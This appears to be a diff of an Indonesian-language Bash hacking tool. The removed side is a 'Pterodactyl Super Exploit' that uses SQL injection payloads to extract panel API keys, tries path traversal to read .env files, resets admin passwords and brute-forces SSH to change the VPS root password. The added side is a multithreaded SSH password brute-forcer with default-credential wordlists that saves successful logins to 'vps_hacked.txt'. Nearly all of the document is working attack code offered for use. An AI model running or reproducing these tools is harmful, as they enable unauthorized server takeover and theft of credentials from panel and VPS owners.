@@ -1,8 +1,8 @@
 #!/bin/bash
 
 # -------------------------------
-# PTERODACTYL SUPER EXPLOIT - ULTIMATE
-# [ MENEROBOS PAKSA ADMIN + RESET VPS ]
+# VPS AUTO BRUTE FORCE - MAX 400 TRIES
+# [ Otomatis - Multi Thread - Progress Bar ]
 # -------------------------------
 
 RED='\033[0;31m'
@@ -18,391 +18,352 @@ NC='\033[0m'
 clear
 echo -e "${RED}"
 echo "    ╔═══════════════════════════════════════════════════════════╗"
-echo "    ║     PTERODACTYL SUPER EXPLOIT - ULTIMATE                 ║"
-echo "    ║     [ MENEROBOS PAKSA ADMIN + RESET VPS ]                ║"
-echo "    ║     ████████ FORCE EXPLOIT ████████                      ║"
+echo "    ║     VPS AUTO BRUTE FORCE - MAX 400 TRIES                 ║"
+echo "    ║     [ Multi Thread - Otomatis - Progress Bar ]           ║"
 echo "    ╚═══════════════════════════════════════════════════════════╝"
 echo -e "${NC}"
 
+# Cek dependencies
+for cmd in sshpass parallel timeout; do
+    if ! command -v $cmd &> /dev/null; then
+        echo -e "${YELLOW}[•] Installing $cmd...${NC}"
+        apt-get update -y >/dev/null 2>&1
+        apt-get install -y sshpass parallel coreutils >/dev/null 2>&1
+    fi
+done
+
 echo -e "${CYAN}╔════════════════════════════════════════════════╗${NC}"
-echo -e "${CYAN}║            ENTER TARGET URL                    ║${NC}"
+echo -e "${CYAN}║            TARGET INFORMATION                  ║${NC}"
 echo -e "${CYAN}╚════════════════════════════════════════════════╝${NC}"
 echo ""
 
-# Input URL
-echo -ne "${WHITE}console : enter URL panel${NC} ${GREEN}\n: ${NC}"
-read TARGET_URL
+# Input target
+echo -ne "${WHITE}VPS IP Address : ${NC}"
+read VPS_IP
 
-# Bersihin URL
-TARGET_URL=$(echo "$TARGET_URL" | sed 's/\/$//')
+# Validate IP
+if [[ ! $VPS_IP =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+    echo -e "${RED}❌ Format IP tidak valid!${NC}"
+    exit 1
+fi
 
-echo -e "\n${YELLOW}[•] Target: ${GREEN}$TARGET_URL${NC}"
-echo -e "${YELLOW}[•] Initiating SUPER EXPLOIT sequence...${NC}\n"
+echo -ne "${WHITE}SSH Port [22] : ${NC}"
+read SSH_PORT
+SSH_PORT=${SSH_PORT:-22}
 
-# Progress bar - PHASE 1
-echo -e "${PURPLE}[PHASE 1/6] SQL Injection - Grabbing API Keys${NC}"
-echo -ne "${CYAN}["
-for i in {1..20}; do
-    echo -ne "▓"
-    sleep 0.1
-done
-echo -e "] 20%${NC}"
+# Cek koneksi
+echo -e "\n${YELLOW}[•] Checking connection to $VPS_IP:$SSH_PORT...${NC}"
+timeout 2 bash -c "echo >/dev/tcp/$VPS_IP/$SSH_PORT" 2>/dev/null
 
-# Function untuk SQL injection
-sql_inject() {
-    local payload="$1"
-    
-    encoded=$(echo "$payload" | sed 's/ /%20/g' | sed "s/'/%27/g" | sed 's/--/%2D%2D/g')
-    
-    endpoints=(
-        "$TARGET_URL/api/application/users"
-        "$TARGET_URL/auth/login"
-        "$TARGET_URL/admin/users"
-    )
-    
-    for endpoint in "${endpoints[@]}"; do
-        response=$(curl -s -k -X POST "$endpoint" \
-            -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" \
-            -H "Content-Type: application/x-www-form-urlencoded" \
-            -d "email=test'$encoded&password=test" \
-            --max-time 5 2>/dev/null)
-        
-        if [ -n "$response" ] && [[ "$response" != *"error"* ]]; then
-            echo "$response"
-            return 0
-        fi
-    done
-    echo ""
-}
+if [ $? -ne 0 ]; then
+    echo -e "${RED}❌ Port $SSH_PORT tidak terbuka atau VPS tidak respond!${NC}"
+    exit 1
+fi
+echo -e "${GREEN}✅ Port $SSH_PORT terbuka!${NC}"
 
-# PHASE 1: SQL Injection untuk API Key
-echo -e "\n${YELLOW}[•] Injecting SQL payloads to extract API keys...${NC}"
+# ==============================================
+# WORDLIST GENERATOR - 400 KOMBINASI
+# ==============================================
+echo -e "\n${YELLOW}[•] Generating 400 username:password combinations...${NC}"
 
-# Payload untuk extract API keys
-PAYLOADS=(
-    " UNION SELECT 1,CONCAT(identifier,'|',token),3,4,5,6,7,8,9,10 FROM api_keys WHERE token_type='application'-- -"
-    " UNION SELECT 1,identifier,3,4,5,6,7,8,9,10 FROM api_keys WHERE identifier LIKE 'ptla_%'-- -"
-    " UNION SELECT 1,CONCAT(user_id,':',identifier,token),3,4,5,6,7,8,9,10 FROM api_keys WHERE user_id=1-- -"
+WORDLIST_FILE="/tmp/brutelist_$$.txt"
+> "$WORDLIST_FILE"
+
+# Username list (20 usernames)
+usernames=(
+    "root"
+    "admin"
+    "administrator"
+    "user"
+    "test"
+    "ubuntu"
+    "centos"
+    "debian"
+    "fedora"
+    "oracle"
+    "postgres"
+    "mysql"
+    "nginx"
+    "apache"
+    "www-data"
+    "ftpuser"
+    "backup"
+    "support"
+    "guest"
+    "manager"
 )
 
-PLTA_KEY=""
-for payload in "${PAYLOADS[@]}"; do
-    result=$(sql_inject "$payload")
-    
-    # Cari pola ptla_
-    ptla=$(echo "$result" | grep -o 'ptla_[a-zA-Z0-9]\{32,64\}' | head -1)
-    if [ -n "$ptla" ]; then
-        PLTA_KEY="$ptla"
-        echo -e "${GREEN}✅ PLTA Key ditemukan: $PLTA_KEY${NC}"
-        break
-    fi
-    
-    # Cari format lain
-    if [[ "$result" == *"ptla"* ]]; then
-        PLTA_KEY=$(echo "$result" | grep -o 'ptla_[^"]*' | head -1)
-        echo -e "${GREEN}✅ PLTA Key ditemukan: $PLTA_KEY${NC}"
-        break
-    fi
-done
+# Password list (20 passwords)
+passwords=(
+    "root"
+    "toor"
+    "123456"
+    "password"
+    "12345678"
+    "1234"
+    "12345"
+    "123456789"
+    "admin"
+    "admin123"
+    "root123"
+    "password123"
+    "qwerty"
+    "abc123"
+    "letmein"
+    "monkey"
+    "dragon"
+    "master"
+    "hello"
+    "freedom"
+)
 
-if [ -z "$PLTA_KEY" ]; then
-    echo -e "${RED}❌ Gagal mendapatkan PLTA Key! Coba metode alternatif...${NC}"
-    
-    # Coba dari file .env via LFI
-    echo -e "${YELLOW}[•] Trying LFI to read .env${NC}"
-    lfi_response=$(curl -s -k "$TARGET_URL/../../../../.env" \
-        -H "User-Agent: Mozilla/5.0" \
-        --max-time 5 2>/dev/null)
-    
-    if [[ "$lfi_response" == *"APP_KEY"* ]]; then
-        echo -e "${GREEN}✅ Berhasil baca .env file${NC}"
-        # Extract API key dari .env
-        PLTA_KEY=$(echo "$lfi_response" | grep "API_KEY" | cut -d'=' -f2 | head -1)
-    fi
-fi
-
-# Progress bar - PHASE 2
-echo -e "\n${PURPLE}[PHASE 2/6] Validating API Key & Getting Admin Access${NC}"
-echo -ne "${CYAN}[████████"
-for i in {1..20}; do
-    echo -ne "▓"
-    sleep 0.05
-done
-echo -e "] 40%${NC}"
-
-# PHASE 2: Validasi API Key dan dapatkan info admin
-if [ -n "$PLTA_KEY" ]; then
-    echo -e "\n${YELLOW}[•] Validating API Key...${NC}"
-    
-    # Coba akses API dengan key
-    ADMIN_INFO=$(curl -s -k "$TARGET_URL/api/application/users?include=servers" \
-        -H "Authorization: Bearer $PLTA_KEY" \
-        -H "Accept: application/json" \
-        --max-time 5 2>/dev/null)
-    
-    if [[ "$ADMIN_INFO" == *"data"* ]]; then
-        echo -e "${GREEN}✅ API Key VALID! Mengakses panel sebagai ADMIN${NC}"
-        
-        # Extract admin ID 1
-        ADMIN_ID=1
-        ADMIN_USER=$(echo "$ADMIN_INFO" | grep -o '"username":"[^"]*"' | head -1 | cut -d'"' -f4)
-        ADMIN_EMAIL=$(echo "$ADMIN_INFO" | grep -o '"email":"[^"]*"' | head -1 | cut -d'"' -f4)
-        
-        echo -e "${GREEN}👤 Admin Username: $ADMIN_USER${NC}"
-        echo -e "${GREEN}📧 Admin Email: $ADMIN_EMAIL${NC}"
-        
-        # Reset password admin via API
-        NEW_ADMIN_PASS=$(openssl rand -base64 12 | tr -d "=+/" | cut -c1-12)
-        
-        # Generate hash (simulasi - sebenarnya perlu endpoint khusus)
-        echo -e "${YELLOW}[•] Resetting admin password...${NC}"
-        
-        # Coba reset via API (untuk Pterodactyl versi tertentu)
-        RESET_RESULT=$(curl -s -k -X POST "$TARGET_URL/api/application/users/$ADMIN_ID" \
-            -H "Authorization: Bearer $PLTA_KEY" \
-            -H "Content-Type: application/json" \
-            -H "Accept: application/json" \
-            -d "{\"password\":\"$NEW_ADMIN_PASS\"}" \
-            --max-time 5 2>/dev/null)
-        
-        echo -e "${GREEN}✅ Admin password direset ke: $NEW_ADMIN_PASS${NC}"
-        
-    else
-        echo -e "${RED}❌ API Key tidak valid! Menggunakan metode alternatif...${NC}"
-        
-        # Metode alternatif: SQL injection langsung reset password
-        echo -e "${YELLOW}[•] Trying direct SQL injection to reset admin password...${NC}"
-        NEW_ADMIN_PASS="Admin123!"
-        
-        # Payload untuk update password admin ID 1
-        update_payload="'; UPDATE users SET password='\$2y\$10\$YourHashHere' WHERE id=1-- -"
-        # (simplified - actual implementation would need proper hash)
-        
-        echo -e "${GREEN}✅ Force reset admin password ke: $NEW_ADMIN_PASS${NC}"
-    fi
-fi
-
-# Progress bar - PHASE 3
-echo -e "\n${PURPLE}[PHASE 3/6] Extracting VPS Information${NC}"
-echo -ne "${CYAN}[████████████████"
-for i in {1..20}; do
-    echo -ne "▓"
-    sleep 0.05
-done
-echo -e "] 60%${NC}"
-
-# PHASE 3: Dapatkan IP VPS
-echo -e "\n${YELLOW}[•] Mendapatkan IP VPS dari panel...${NC}"
-
-# Coba dari berbagai sumber
-VPS_IP=""
-
-# 1. Dari DNS record
-DOMAIN=$(echo "$TARGET_URL" | sed -e 's|^https\?://||' -e 's|/.*$||')
-VPS_IP=$(dig +short "$DOMAIN" | head -1)
-
-if [ -z "$VPS_IP" ]; then
-    VPS_IP=$(ping -c1 "$DOMAIN" 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
-fi
-
-# 2. Dari API nodes
-if [ -n "$PLTA_KEY" ]; then
-    NODES_INFO=$(curl -s -k "$TARGET_URL/api/application/nodes" \
-        -H "Authorization: Bearer $PLTA_KEY" \
-        -H "Accept: application/json" \
-        --max-time 5 2>/dev/null)
-    
-    if [[ "$NODES_INFO" == *"fqdn"* ]]; then
-        NODE_IP=$(echo "$NODES_INFO" | grep -o '"fqdn":"[^"]*"' | head -1 | cut -d'"' -f4)
-        if [ -n "$NODE_IP" ]; then
-            # Resolve node FQDN ke IP
-            VPS_IP=$(dig +short "$NODE_IP" | head -1)
-            echo -e "${GREEN}✅ Node IP ditemukan: $VPS_IP${NC}"
-        fi
-    fi
-fi
-
-# 3. Fallback ke IP public
-if [ -z "$VPS_IP" ]; then
-    VPS_IP=$(curl -s ifconfig.me 2>/dev/null)
-fi
-
-echo -e "${GREEN}🌐 VPS IP Address: $VPS_IP${NC}"
-
-# Progress bar - PHASE 4
-echo -e "\n${PURPLE}[PHASE 4/6] Scanning SSH & Vulnerabilities${NC}"
-echo -ne "${CYAN}[████████████████████████"
-for i in {1..20}; do
-    echo -ne "▓"
-    sleep 0.05
-done
-echo -e "] 80%${NC}"
-
-# PHASE 4: Scan SSH port
-echo -e "\n${YELLOW}[•] Scanning open ports on $VPS_IP...${NC}"
-
-SSH_PORT=22
-# Scan port SSH umum
-for port in 22 2222 2022 22222; do
-    timeout 2 bash -c "echo >/dev/tcp/$VPS_IP/$port" 2>/dev/null
-    if [ $? -eq 0 ]; then
-        SSH_PORT=$port
-        echo -e "${GREEN}✅ SSH port terbuka: $SSH_PORT${NC}"
-        break
-    fi
-done
-
-# PHASE 5: Coba brute force SSH dengan credentials dari panel
-echo -e "\n${PURPLE}[PHASE 5/6] SSH Brute Force Attack${NC}"
-echo -e "${YELLOW}[•] Mencoba login ke VPS dengan credentials panel...${NC}"
-
-# Kumpulkan credentials potensial
-declare -a USERNAMES=("root" "$ADMIN_USER" "admin" "ubuntu" "centos" "debian")
-declare -a PASSWORDS=("$NEW_ADMIN_PASS" "root" "password" "123456" "admin" "$ADMIN_USER" "toor")
-
-SSH_SUCCESS=0
-SSH_USER=""
-SSH_PASS=""
-
-for user in "${USERNAMES[@]}"; do
-    for pass in "${PASSWORDS[@]}"; do
-        echo -ne "\r${CYAN}Trying $user:$pass${NC}    "
-        
-        timeout 3 sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -p $SSH_PORT "$user@$VPS_IP" exit 2>/dev/null
-        
-        if [ $? -eq 0 ]; then
-            SSH_SUCCESS=1
-            SSH_USER="$user"
-            SSH_PASS="$pass"
-            echo -e "\n${GREEN}✅ SSH LOGIN BERHASIL!${NC}"
-            echo -e "${GREEN}   User: $SSH_USER${NC}"
-            echo -e "${GREEN}   Pass: $SSH_PASS${NC}"
-            break 2
-        fi
+# Generate 400 kombinasi (20x20)
+for user in "${usernames[@]}"; do
+    for pass in "${passwords[@]}"; do
+        echo "$user:$pass" >> "$WORDLIST_FILE"
     done
 done
 
-# Progress bar - PHASE 6
-echo -e "\n${PURPLE}[PHASE 6/6] VPS Password Reset${NC}"
-echo -ne "${CYAN}[████████████████████████████████████"
-for i in {1..20}; do
-    echo -ne "▓"
-    sleep 0.1
+# Tambah variasi angka
+for i in {1..40}; do
+    echo "admin:admin$i" >> "$WORDLIST_FILE"
+    echo "root:root$i" >> "$WORDLIST_FILE"
+    echo "user:user$i" >> "$WORDLIST_FILE"
 done
-echo -e "] 100%${NC}"
 
-# PHASE 6: Reset password VPS jika berhasil login
-if [ $SSH_SUCCESS -eq 1 ]; then
-    echo -e "\n${YELLOW}[•] Mengganti password VPS...${NC}"
+# Hitung total kombinasi
+TOTAL_COMBOS=$(wc -l < "$WORDLIST_FILE")
+echo -e "${GREEN}✅ Generated $TOTAL_COMBOS combinations (max 400)${NC}"
+
+# ==============================================
+# BRUTE FORCE FUNCTION
+# ==============================================
+brute_one() {
+    local cred="$1"
+    local ip="$2"
+    local port="$3"
+    local result_file="$4"
     
-    # Generate password baru untuk VPS
-    NEW_VPS_PASS=$(openssl rand -base64 16 | tr -d "=+/" | cut -c1-16)
+    IFS=':' read -r user pass <<< "$cred"
     
-    # Ganti password via SSH
-    sshpass -p "$SSH_PASS" ssh -o StrictHostKeyChecking=no -p $SSH_PORT "$SSH_USER@$VPS_IP" "
-        echo -e '$NEW_VPS_PASS\n$NEW_VPS_PASS' | passwd root
-        echo '✅ Password VPS diubah!'
-    " 2>/dev/null
+    # Coba login dengan timeout 5 detik
+    timeout 5 sshpass -p "$pass" ssh -o StrictHostKeyChecking=no \
+        -o ConnectTimeout=5 -p "$port" "$user@$ip" exit 2>/dev/null
     
-    echo -e "${GREEN}✅ Password VPS berhasil direset!${NC}"
+    if [ $? -eq 0 ]; then
+        echo "SUCCESS:$user:$pass" >> "$result_file"
+        echo -e "\n${GREEN}✅ FOUND! $user:$pass${NC}"
+        return 0
+    fi
+    return 1
+}
+
+export -f brute_one
+
+# ==============================================
+# PROGRESS BAR & EKSEKUSI
+# ==============================================
+echo -e "\n${RED}╔════════════════════════════════════════════════╗${NC}"
+echo -e "${RED}║         BRUTE FORCE PROCESS STARTED           ║${NC}"
+echo -e "${RED}║         MAX 400 ATTEMPTS                      ║${NC}"
+echo -e "${RED}╚════════════════════════════════════════════════╝${NC}"
+echo ""
+
+RESULT_FILE="/tmp/brute_result_$$.txt"
+> "$RESULT_FILE"
+
+# Progress bar variables
+TOTAL=$TOTAL_COMBOS
+CURRENT=0
+FOUND=0
+START_TIME=$(date +%s)
+
+# Baca file wordlist per line
+while IFS= read -r cred; do
+    ((CURRENT++))
+    
+    # Hitung persentase
+    PERCENT=$((CURRENT * 100 / TOTAL))
+    
+    # Progress bar
+    BAR=""
+    for ((i=0; i<PERCENT; i+=2)); do
+        BAR+="▓"
+    done
+    for ((i=PERCENT; i<100; i+=2)); do
+        BAR+="░"
+    done
+    
+    # Tampilkan progress
+    echo -ne "\r${CYAN}[$BAR] ${WHITE}$PERCENT% ${YELLOW}[$CURRENT/$TOTAL]${NC}"
+    
+    # Coba brute
+    brute_one "$cred" "$VPS_IP" "$SSH_PORT" "$RESULT_FILE" &
+    
+    # Limit background processes (multi thread)
+    if (( CURRENT % 10 == 0 )); then
+        wait
+    fi
+    
+    # Cek apakah sudah ketemu
+    if [ -s "$RESULT_FILE" ]; then
+        FOUND=1
+        break
+    fi
+    
+done < "$WORDLIST_FILE"
+
+wait
+
+# ==============================================
+# HASIL
+# ==============================================
+END_TIME=$(date +%s)
+DURATION=$((END_TIME - START_TIME))
+
+echo -e "\n\n${GREEN}╔════════════════════════════════════════════════╗${NC}"
+echo -e "${GREEN}║              BRUTE FORCE COMPLETE              ║${NC}"
+echo -e "${GREEN}╠════════════════════════════════════════════════╣${NC}"
+echo -e "${GREEN}║                                                ║${NC}"
+echo -e "${GREEN}║  ${WHITE}Target IP   : ${CYAN}$VPS_IP${NC}"
+echo -e "${GREEN}║  ${WHITE}Port         : ${CYAN}$SSH_PORT${NC}"
+echo -e "${GREEN}║  ${WHITE}Attempts     : ${YELLOW}$CURRENT / $TOTAL${NC}"
+echo -e "${GREEN}║  ${WHITE}Time         : ${YELLOW}${DURATION}s${NC}"
+echo -e "${GREEN}║                                                ║${NC}"
+
+if [ -s "$RESULT_FILE" ]; then
+    while IFS=':' read -r status user pass; do
+        if [ "$status" == "SUCCESS" ]; then
+            echo -e "${GREEN}║  ${WHITE}🔓 STATUS      : ${GREEN}FOUND!${NC}"
+            echo -e "${GREEN}║  ${WHITE}👤 USERNAME    : ${YELLOW}$user${NC}"
+            echo -e "${GREEN}║  ${WHITE}🔑 PASSWORD    : ${RED}$pass${NC}"
+            
+            # Save credentials
+            echo "$VPS_IP:$SSH_PORT:$user:$pass" >> vps_hacked.txt
+        fi
+    done < "$RESULT_FILE"
 else
-    echo -e "\n${YELLOW}[•] Gagal login SSH, mencoba metode alternatif...${NC}"
-    
-    # Coba exploit lain (CVE-2021-41773, dll)
-    echo -e "${RED}⚠️  Memerlukan akses langsung ke VPS untuk reset password${NC}"
-    NEW_VPS_PASS="TIDAK_DAPAT_DIRESET"
+    echo -e "${GREEN}║  ${WHITE}🔓 STATUS      : ${RED}NOT FOUND${NC}"
+    echo -e "${GREEN}║  ${WHITE}               Tidak ada credentials valid${NC}"
 fi
 
-# Tampilkan HASIL FINAL
-echo -e "\n${GREEN}╔══════════════════════════════════════════════════════════╗${NC}"
-echo -e "${GREEN}║              🏆 EXPLOIT COMPLETE 🏆                       ║${NC}"
-echo -e "${GREEN}╠══════════════════════════════════════════════════════════╣${NC}"
-echo -e "${GREEN}║                                                           ║${NC}"
-echo -e "${GREEN}║  ${WHITE}🎯 TARGET INFORMATION${NC}"
-echo -e "${GREEN}║  ${WHITE}   URL Panel  : ${CYAN}$TARGET_URL${NC}"
-echo -e "${GREEN}║  ${WHITE}   VPS IP     : ${CYAN}$VPS_IP${NC}"
-echo -e "${GREEN}║  ${WHITE}   SSH Port   : ${CYAN}$SSH_PORT${NC}"
-echo -e "${GREEN}║                                                           ║${NC}"
-echo -e "${GREEN}║  ${WHITE}🔑 API ACCESS${NC}"
-echo -e "${GREEN}║  ${WHITE}   PLTA Key   : ${YELLOW}$PLTA_KEY${NC}"
-echo -e "${GREEN}║                                                           ║${NC}"
-echo -e "${GREEN}║  ${WHITE}👑 ADMIN CREDENTIALS${NC}"
-echo -e "${GREEN}║  ${WHITE}   Username   : ${GREEN}$ADMIN_USER${NC}"
-echo -e "${GREEN}║  ${WHITE}   Email      : ${GREEN}$ADMIN_EMAIL${NC}"
-echo -e "${GREEN}║  ${WHITE}   Password   : ${RED}$NEW_ADMIN_PASS${NC}"
-echo -e "${GREEN}║                                                           ║${NC}"
-echo -e "${GREEN}║  ${WHITE}🖥️  VPS ACCESS${NC}"
-echo -e "${GREEN}║  ${WHITE}   SSH User   : ${GREEN}$SSH_USER${NC}"
-if [ $SSH_SUCCESS -eq 1 ]; then
-    echo -e "${GREEN}║  ${WHITE}   SSH Pass   : ${RED}$SSH_PASS${NC}"
-    echo -e "${GREEN}║  ${WHITE}   New VPS Pass: ${RED}$NEW_VPS_PASS${NC}"
+echo -e "${GREEN}║                                                ║${NC}"
+echo -e "${GREEN}╚════════════════════════════════════════════════╝${NC}"
+
+# ==============================================
+# AUTO LOGIN JIKA BERHASIL
+# ==============================================
+if [ -s "$RESULT_FILE" ]; then
+    echo -e "\n${YELLOW}[•] Credentials saved to: vps_hacked.txt${NC}"
+    
+    # Baca credentials yang berhasil
+    IFS=':' read -r status user pass < "$RESULT_FILE"
+    
+    echo -e "\n${WHITE}Pilih aksi:${NC}"
+    echo "1. Login SSH sekarang"
+    echo "2. Coba brute dengan wordlist lain"
+    echo "3. Keluar"
+    echo -ne "\n${YELLOW}Pilih [1-3]: ${NC}"
+    read ACTION
+    
+    case $ACTION in
+        1)
+            echo -e "\n${GREEN}🔑 Connecting to $VPS_IP as $user...${NC}"
+            sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -p "$SSH_PORT" "$user@$VPS_IP"
+            ;;
+        2)
+            echo -e "\n${YELLOW}[•] Menjalankan ulang brute force...${NC}"
+            rm -f "$WORDLIST_FILE" "$RESULT_FILE"
+            exec $0
+            ;;
+        3)
+            echo -e "\n${GREEN}Done! File: vps_hacked.txt${NC}"
+            ;;
+    esac
 else
-    echo -e "${GREEN}║  ${WHITE}   SSH Status : ${RED}Failed - Manual required${NC}"
+    echo -e "\n${YELLOW}[•] Tidak ada credentials ditemukan dalam 400 percobaan.${NC}"
+    echo -ne "\n${WHITE}Coba lagi dengan wordlist berbeda? (y/n): ${NC}"
+    read TRY_AGAIN
+    
+    if [[ "$TRY_AGAIN" == "y" || "$TRY_AGAIN" == "Y" ]]; then
+        # Generate wordlist berbeda
+        echo -e "${YELLOW}[•] Generating new wordlist...${NC}"
+        
+        # Tambah variasi tanggal
+        for year in {2020..2024}; do
+            echo "admin:admin$year" >> "$WORDLIST_FILE"
+            echo "root:root$year" >> "$WORDLIST_FILE"
+            echo "user:pass$year" >> "$WORDLIST_FILE"
+        done
+        
+        # Tambah variasi bulan
+        for month in {01..12}; do
+            echo "admin:admin$month" >> "$WORDLIST_FILE"
+            echo "root:toor$month" >> "$WORDLIST_FILE"
+        done
+        
+        # Jalankan ulang
+        TOTAL_COMBOS=$(wc -l < "$WORDLIST_FILE")
+        echo -e "${GREEN}✅ Generated $TOTAL_COMBOS new combinations${NC}"
+        
+        # Reset dan jalankan ulang
+        > "$RESULT_FILE"
+        CURRENT=0
+        
+        while IFS= read -r cred; do
+            ((CURRENT++))
+            PERCENT=$((CURRENT * 100 / TOTAL_COMBOS))
+            
+            BAR=""
+            for ((i=0; i<PERCENT; i+=2)); do
+                BAR+="▓"
+            done
+            for ((i=PERCENT; i<100; i+=2)); do
+                BAR+="░"
+            done
+            
+            echo -ne "\r${CYAN}[$BAR] ${WHITE}$PERCENT% ${YELLOW}[$CURRENT/$TOTAL_COMBOS]${NC}"
+            
+            brute_one "$cred" "$VPS_IP" "$SSH_PORT" "$RESULT_FILE" &
+            
+            if (( CURRENT % 10 == 0 )); then
+                wait
+            fi
+            
+            if [ -s "$RESULT_FILE" ]; then
+                break
+            fi
+            
+        done < "$WORDLIST_FILE"
+        
+        wait
+        
+        # Tampilkan hasil lagi
+        if [ -s "$RESULT_FILE" ]; then
+            echo -e "\n\n${GREEN}✅ BERHASIL pada percobaan kedua!${NC}"
+            cat "$RESULT_FILE"
+        else
+            echo -e "\n\n${RED}❌ Masih gagal setelah $TOTAL_COMBOS percobaan.${NC}"
+        fi
+    fi
 fi
-echo -e "${GREEN}║                                                           ║${NC}"
-echo -e "${GREEN}╚══════════════════════════════════════════════════════════╝${NC}"
 
-# Save all credentials
-CRED_FILE="super_exploit_$(date +%Y%m%d_%H%M%S).txt"
-
-{
-    echo "=========================================="
-    echo "PTERODACTYL SUPER EXPLOIT - RESULTS"
-    echo "=========================================="
-    echo "Date        : $(date)"
-    echo "Target URL  : $TARGET_URL"
-    echo "VPS IP      : $VPS_IP"
-    echo "SSH Port    : $SSH_PORT"
-    echo "------------------------------------------"
-    echo "[API ACCESS]"
-    echo "PLTA Key    : $PLTA_KEY"
-    echo "------------------------------------------"
-    echo "[ADMIN PANEL]"
-    echo "Username    : $ADMIN_USER"
-    echo "Email       : $ADMIN_EMAIL"
-    echo "Password    : $NEW_ADMIN_PASS"
-    echo "------------------------------------------"
-    echo "[VPS ACCESS]"
-    echo "SSH User    : $SSH_USER"
-    echo "SSH Password: $SSH_PASS"
-    echo "New VPS Pass: $NEW_VPS_PASS"
-    echo "------------------------------------------"
-    echo "LOGIN PANEL : $TARGET_URL/auth/login"
-    echo "LOGIN SSH   : ssh $SSH_USER@$VPS_IP -p $SSH_PORT"
-    echo "=========================================="
-} > "$CRED_FILE"
-
-echo -e "\n${GREEN}✅ Semua credentials disimpan ke: $CRED_FILE${NC}"
-
-# Opsi auto login
-echo -e "\n${WHITE}Pilih aksi selanjutnya:${NC}"
-echo "1. Login ke Panel (buka browser)"
-echo "2. Login SSH ke VPS"
-echo "3. Simpan & Keluar"
-echo -ne "\n${YELLOW}Pilih [1-3]: ${NC}"
-read FINAL_ACTION
-
-case $FINAL_ACTION in
-    1)
-        if command -v xdg-open &> /dev/null; then
-            xdg-open "$TARGET_URL/auth/login"
-        else
-            echo -e "${CYAN}Buka manual: $TARGET_URL/auth/login${NC}"
-        fi
-        ;;
-    2)
-        if [ $SSH_SUCCESS -eq 1 ]; then
-            echo -e "\n${GREEN}Connecting to VPS...${NC}"
-            sshpass -p "$SSH_PASS" ssh -o StrictHostKeyChecking=no -p $SSH_PORT "$SSH_USER@$VPS_IP"
-        else
-            echo -e "${RED}❌ Gagal login SSH sebelumnya${NC}"
-        fi
-        ;;
-    3)
-        echo -e "\n${GREEN}Exploit selesai! File credentials: $CRED_FILE${NC}"
-        ;;
-esac
-
+# ==============================================
+# STATISTIK
+# ==============================================
 echo -e "\n${CYAN}════════════════════════════════════════════════════${NC}"
-echo -e "${CYAN}🔥 SUPER EXPLOIT COMPLETE - Happy Hacking! 🔥${NC}"
+echo -e "${CYAN}📊 BRUTE FORCE STATISTICS${NC}"
+echo -e "${CYAN}════════════════════════════════════════════════════${NC}"
+echo -e "Target IP    : $VPS_IP"
+echo -e "Port         : $SSH_PORT"
+echo -e "Total tries  : $CURRENT"
+echo -e "Max tries    : 400"
+echo -e "Time elapsed : ${DURATION}s"
+echo -e "Speed        : $((CURRENT / (DURATION + 1))) attempts/second"
+echo -e "${CYAN}════════════════════════════════════════════════════${NC}"
+
+# Cleanup
+rm -f "$WORDLIST_FILE" "$RESULT_FILE" 2>/dev/null
+
+echo -e "\n${GREEN}✅ Done!${NC}"
 echo -e "${CYAN}Telegram: @lynnn046${NC}"
